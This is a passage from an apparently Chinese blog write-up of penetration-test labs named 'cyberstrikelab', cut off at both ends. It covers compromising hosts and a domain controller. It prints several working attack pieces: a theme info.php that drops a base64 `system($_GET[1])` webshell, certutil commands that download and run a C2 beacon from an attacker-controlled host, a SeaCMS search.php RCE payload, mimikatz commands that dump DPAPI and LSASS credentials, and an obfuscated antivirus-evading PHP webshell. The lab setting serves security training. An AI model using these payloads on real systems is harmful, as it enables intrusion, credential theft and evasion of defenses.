	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206185028346_hu16475833092937327051.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206185028346_hu13412574774885541820.png 1024w"
	loading="lazy"
	
		alt="image-20260206185028346"
	
	
		class="gallery-image" 
		data-flex-grow="115"
		data-flex-basis="277px"
	
></p>
<p>找一下主题上传的点</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206185256240.png"
	width="1216"
	height="920"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206185256240_hu17104572313807982679.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206185256240_hu7135863015757078463.png 1024w"
	loading="lazy"
	
		alt="image-20260206185256240"
	
	
		class="gallery-image" 
		data-flex-grow="132"
		data-flex-basis="317px"
	
></p>
<p>先下一个合法主题https://github.com/billcreswell/redline-theme</p>
<p>修改一下<code>info.php</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="s1">&#39;2.php&#39;</span><span class="p">,</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="s1">&#39;PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/Pg==&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">//&lt;?php system($_GET[1]);?&gt;
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>然后再压缩成压缩包上传上去（这里用POST失败了，不知道怎么回事）</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206190356369.png"
	width="621"
	height="189"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206190356369_hu14385451222707294542.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206190356369_hu5219808767587800009.png 1024w"
	loading="lazy"
	
		alt="image-20260206190356369"
	
	
		class="gallery-image" 
		data-flex-grow="328"
		data-flex-basis="788px"
	
></p>
<p>不看杀软了，直接网络分离上线CS</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://10.0.0.34/2.php?1=certutil -urlcache -split -f http://172.16.233.2:50055/a1.exe a1.exe
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">http://10.0.0.34/2.php?1=a1.exe ttp://172.16.233.2:50055/a1.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206191117020.png"
	width="768"
	height="183"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206191117020_hu12653818732131010813.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206191117020_hu13929262325774333941.png 1024w"
	loading="lazy"
	
		alt="image-20260206191117020"
	
	
		class="gallery-image" 
		data-flex-grow="419"
		data-flex-basis="1007px"
	
></p>
<h3 id="flag2-8">flag2
</h3><h4 id="知识点seacms历史漏洞">知识点：seacms历史漏洞
</h4><p>老样子，传<code>stowaway</code>和<code>fscan</code>进行内网渗透</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206191255480.png"
	width="986"
	height="436"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206191255480_hu5627608627191698522.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206191255480_hu15385251994945680082.png 1024w"
	loading="lazy"
	
		alt="image-20260206191255480"
	
	
		class="gallery-image" 
		data-flex-grow="226"
		data-flex-basis="542px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206191556553.png"
	width="472"
	height="93"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206191556553_hu4646540807878133464.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206191556553_hu16749266926773354368.png 1024w"
	loading="lazy"
	
		alt="image-20260206191556553"
	
	
		class="gallery-image" 
		data-flex-grow="507"
		data-flex-basis="1218px"
	
></p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>ip</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>10.5.8.43</td>
<td>外网机（拿下）</td>
</tr>
<tr>
<td>10.5.8.50</td>
<td>DC  域控</td>
</tr>
<tr>
<td>10.5.8.88</td>
<td>cslab  存在web服务</td>
</tr>
</tbody>
</table></div>
<p>显然现在要打<code>88</code>这台web服务 <code>seacms</code>继续打nday</p>
<p>（这里其他人都能扫出漏洞，为啥我的不行）</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206192259749.png"
	width="538"
	height="267"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206192259749_hu2324015334261777623.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206192259749_hu15945262625519241797.png 1024w"
	loading="lazy"
	
		alt="image-20260206192259749"
	
	
		class="gallery-image" 
		data-flex-grow="201"
		data-flex-basis="483px"
	
></p>
<p>漏洞利用</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /search.php HTTP/1.1
</span></span><span class="line"><span class="cl">Host: 10.5.8.88
</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
</span></span><span class="line"><span class="cl">Content-Length: 203
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=({searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;ver=OST[x]))&amp;x=system(&#39;whoami&#39;);
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206192500994.png"
	width="932"
	height="293"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206192500994_hu18062698286099691339.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206192500994_hu11803092599218611962.png 1024w"
	loading="lazy"
	
		alt="image-20260206192500994"
	
	
		class="gallery-image" 
		data-flex-grow="318"
		data-flex-basis="763px"
	
></p>
<p>直接上线，当然事先在外网机的<code>C:\phpStudy\WWW</code>目录下上传这两个文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">certutil -urlcache -split -f http://10.5.8.43/4444.exe 4444.exe
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">4444.exe http://10.5.8.43/4444.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">connect 10.5.8.88
</span></span></code></pre></td></tr></table>
</div>
</div><p>上线成功</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206192849123.png"
	width="779"
	height="324"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206192849123_hu8780527486047386612.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206192849123_hu11167133154300257989.png 1024w"
	loading="lazy"
	
		alt="image-20260206192849123"
	
	
		class="gallery-image" 
		data-flex-grow="240"
		data-flex-basis="577px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206192944982.png"
	width="768"
	height="177"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206192944982_hu10591206323116133281.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206192944982_hu8527546802973426159.png 1024w"
	loading="lazy"
	
		alt="image-20260206192944982"
	
	
		class="gallery-image" 
		data-flex-grow="433"
		data-flex-basis="1041px"
	
></p>
<h3 id="flag3-7">flag3
</h3><h4 id="知识点dpapi凭据解密">知识点：DPAPI凭据解密
</h4><p>打域控一般都先看看同一域中的主机有没有什么信息，一般自己创建用户的RDP都会少些东西，我们查看一下windows自动登录配置</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell reg query &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>是管理员权限，那么就可以RDP登录本地管理员的账号了</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206194133473.png"
	width="756"
	height="258"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206194133473_hu7054935742820115915.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206194133473_hu5556875098658216394.png 1024w"
	loading="lazy"
	
		alt="image-20260206194133473"
	
	
		class="gallery-image" 
		data-flex-grow="293"
		data-flex-basis="703px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">administrator/Sea@asd
</span></span></code></pre></td></tr></table>
</div>
</div><p>查找保存的远程连接 TERMSRV/10.5.8.50 的域管密码、查找凭证</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">dir /a C:\Users\Administrator\AppData\Local\Microsoft\Credentials\*
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206194806147.png"
	width="756"
	height="251"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206194806147_hu8568191360327520600.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206194806147_hu13039250033586137260.png 1024w"
	loading="lazy"
	
		alt="image-20260206194806147"
	
	
		class="gallery-image" 
		data-flex-grow="301"
		data-flex-basis="722px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">811292CB3B95926F7EA2D46FEB2A7ADB
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell C:\Users\Public\mimikatz.exe &#34;dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\811292CB3B95926F7EA2D46FEB2A7ADB&#34; &#34;exit&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>获取<code>guidMasterKey</code></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206195134966.png"
	width="1169"
	height="366"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206195134966_hu14538982373603892609.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206195134966_hu13723828055492105413.png 1024w"
	loading="lazy"
	
		alt="image-20260206195134966"
	
	
		class="gallery-image" 
		data-flex-grow="319"
		data-flex-basis="766px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{2e550db8-ab33-407c-8a29-120d38c9d711}
</span></span></code></pre></td></tr></table>
</div>
</div><p>通过LSASS进程获取对应的MasterKey</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell C:\Users\Public\mimikatz.exe &#34;privilege::debug&#34; &#34;sekurlsa::dpapi&#34; &#34;exit&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206195442925.png"
	width="976"
	height="216"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206195442925_hu4597618549888370817.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206195442925_hu2775744102958208009.png 1024w"
	loading="lazy"
	
		alt="image-20260206195442925"
	
	
		class="gallery-image" 
		data-flex-grow="451"
		data-flex-basis="1084px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">24b089facc24b9f698931a52411c777ed146efe5f0248fd0d4b1844f1d441b9970ad86c006627e49b0e8c94179f0b4a8f509f9d8af5af3569faa21d9c56068a9
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后进行解密</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell C:\Users\Public\mimikatz.exe &#34;dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\811292CB3B95926F7EA2D46FEB2A7ADB /masterkey:24b089facc24b9f698931a52411c777ed146efe5f0248fd0d4b1844f1d441b9970ad86c006627e49b0e8c94179f0b4a8f509f9d8af5af3569faa21d9c56068a9&#34; &#34;exit&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后这步需要在之前开了的RDP中执行，不然会失败</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206200139497.png"
	width="481"
	height="428"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206200139497_hu10579021733007400364.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206200139497_hu11061591560012145697.png 1024w"
	loading="lazy"
	
		alt="image-20260206200139497"
	
	
		class="gallery-image" 
		data-flex-grow="112"
		data-flex-basis="269px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">administrator/cs1ab@qs
</span></span></code></pre></td></tr></table>
</div>
</div><p>直接RDP登录就行</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206200802541.png"
	width="608"
	height="328"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206200802541_hu3405349689713616497.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206200802541_hu17193519165609973200.png 1024w"
	loading="lazy"
	
		alt="image-20260206200802541"
	
	
		class="gallery-image" 
		data-flex-grow="185"
		data-flex-basis="444px"
	
></p>
<h4 id="heading-1">
</h4><h2 id="lab15">lab15
</h2><h3 id="flag1-10">flag1
</h3><h4 id="知识点webmin弱口令">知识点：webmin弱口令
</h4><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206203416276.png"
	width="522"
	height="86"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206203416276_hu10072924019252400956.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206203416276_hu10945577641342759123.png 1024w"
	loading="lazy"
	
		alt="image-20260206203416276"
	
	
		class="gallery-image" 
		data-flex-grow="606"
		data-flex-basis="1456px"
	
></p>
<p>提示给了弱口令</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206203425143.png"
	width="1317"
	height="677"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206203425143_hu12972600937219014678.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206203425143_hu10583298432989879531.png 1024w"
	loading="lazy"
	
		alt="image-20260206203425143"
	
	
		class="gallery-image" 
		data-flex-grow="194"
		data-flex-basis="466px"
	
></p>
<p>里面有可以执行命令的</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206203558397.png"
	width="981"
	height="708"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206203558397_hu12416064261605203495.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206203558397_hu11849046807117604044.png 1024w"
	loading="lazy"
	
		alt="image-20260206203558397"
	
	
		class="gallery-image" 
		data-flex-grow="138"
		data-flex-basis="332px"
	
></p>
<p>还是root权限，我们改一下密码直接在<code>finalshell</code>里上</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206203659306.png"
	width="715"
	height="763"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206203659306_hu15915218167933839864.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206203659306_hu3185692265281330843.png 1024w"
	loading="lazy"
	
		alt="image-20260206203659306"
	
	
		class="gallery-image" 
		data-flex-grow="93"
		data-flex-basis="224px"
	
></p>
<h3 id="flag2-9">flag2
</h3><h4 id="知识点">知识点：
</h4><p>修改一下密码，finalshell连接上去</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo root:password|chpasswd
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206204040814.png"
	width="1307"
	height="970"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206204040814_hu15941068274352902582.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206204040814_hu14878799799396826749.png 1024w"
	loading="lazy"
	
		alt="image-20260206204040814"
	
	
		class="gallery-image" 
		data-flex-grow="134"
		data-flex-basis="323px"
	
></p>
<p>然后上线stowaway和fscan</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206204742707.png"
	width="855"
	height="449"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206204742707_hu6183394319189049791.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206204742707_hu4532213497257502393.png 1024w"
	loading="lazy"
	
		alt="image-20260206204742707"
	
	
		class="gallery-image" 
		data-flex-grow="190"
		data-flex-basis="457px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206205012146.png"
	width="488"
	height="132"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206205012146_hu21766084414125305.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206205012146_hu8566771235242503324.png 1024w"
	loading="lazy"
	
		alt="image-20260206205012146"
	
	
		class="gallery-image" 
		data-flex-grow="369"
		data-flex-basis="887px"
	
></p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>ip</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>10.20.30.5</td>
<td>cslab 8008有web服务</td>
</tr>
<tr>
<td>10.20.30.7</td>
<td>外网机 （拿下）</td>
</tr>
<tr>
<td>10.20.30.66</td>
<td>DC</td>
</tr>
</tbody>
</table></div>
<p>打<code>7</code></p>
<p><code>fineCMS</code>打nday</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206205455304.png"
	width="560"
	height="295"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206205455304_hu4726345550099151404.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206205455304_hu1620104228800823371.png 1024w"
	loading="lazy"
	
		alt="image-20260206205455304"
	
	
		class="gallery-image" 
		data-flex-grow="189"
		data-flex-basis="455px"
	
></p>
<p>注册账号后上传头像，JS绕过上传一句话木马</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206210152552.png"
	width="1249"
	height="475"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206210152552_hu2349301032633559100.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206210152552_hu830364495322008138.png 1024w"
	loading="lazy"
	
		alt="image-20260206210152552"
	
	
		class="gallery-image" 
		data-flex-grow="262"
		data-flex-basis="631px"
	
></p>
<p>但是显示目录权限不足，看来不是走上传文件这条路</p>
<p>还是进后台把，爆破一下得到</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin/admin
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后在后台修改域名的地方</p>
<p><img src="C:%5cUsers%5c28105%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20260206211446158.png"
	
	
	
	loading="lazy"
	
		alt="image-20260206211446158"
	
	
></p>
<p><img src="C:%5cUsers%5c28105%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20260206212303188.png"
	
	
	
	loading="lazy"
	
		alt="image-20260206212303188"
	
	
></p>
<h2 id="thunder">Thunder
</h2><h3 id="flag1-11">flag1
</h3><h4 id="知识点thinkphp一把梭免杀php木马">知识点：thinkphp一把梭、免杀php木马
</h4><p><code>thinkphp</code>的站点</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260126153613890.png"
	width="919"
	height="639"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260126153613890_hu17853749865848006763.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260126153613890_hu15782035017768947482.png 1024w"
	loading="lazy"
	
		alt="image-20260126153613890"
	
	
		class="gallery-image" 
		data-flex-grow="143"
		data-flex-basis="345px"
	
></p>
<p>直接用工具试试能不能<code>getshell</code></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260126153824691.png"
	width="1069"
	height="614"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260126153824691_hu14988398621429671840.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260126153824691_hu2867522185003933357.png 1024w"
	loading="lazy"
	
		alt="image-20260126153824691"
	
	
		class="gallery-image" 
		data-flex-grow="174"
		data-flex-basis="417px"
	
></p>
<p>直接蚁剑连接，发现连接不上，看来是被杀了，需要生成一个免杀的php马</p>
<p>（直接用之前用过的webshell生成器，生成一个蚁剑base64的马）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="k">class</span>  <span class="n">G1sO9FH7</span><span class="p">{</span><span class="o">/*</span><span class="n">F85p03</span><span class="o">*/</span><span class="n">function</span> <span class="n">__construct</span><span class="p">(</span><span class="o">$</span><span class="n">x</span><span class="p">){</span><span class="o">$</span><span class="n">c</span><span class="o">=</span><span class="n">str_rot13</span><span class="p">(</span><span class="s1">&#39;ffreg&#39;</span><span class="p">);</span><span class="o">/*</span><span class="n">F85p03</span><span class="o">*/$</span><span class="n">a</span><span class="o">=</span> <span class="p">(</span><span class="s2">&#34;!&#34;</span><span class="o">^</span><span class="s2">&#34;@&#34;</span><span class="p">)</span><span class="o">.$</span><span class="n">c</span><span class="p">;</span><span class="o">/*</span><span class="n">F85p03</span><span class="o">*/$</span><span class="n">a</span><span class="p">(</span><span class="o">$</span><span class="n">x</span><span class="p">);}}</span><span class="n">new</span>  <span class="n">G1sO9FH7</span><span class="p">(</span><span class="o">$</span><span class="n">_REQUEST</span><span class="p">[</span><span class="s1">&#39;1&#39;</span><span class="p">]);</span> <span class="err">?</span><span class="o">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260126154615313.png"
	width="707"
	height="466"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260126154615313_hu15080500622930763386.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260126154615313_hu2840743646276817658.png 1024w"
	loading="lazy"
	
		alt="image-20260126154615313"
	
	
		class="gallery-image" 
		data-flex-grow="151"
		data-flex-basis="364px"
	
></p>
<p>额，被杀了，看来是我手太快了</p>
<p>在网上找一个免杀马再传一下</p>
<div class="highlight"><div class="chroma">
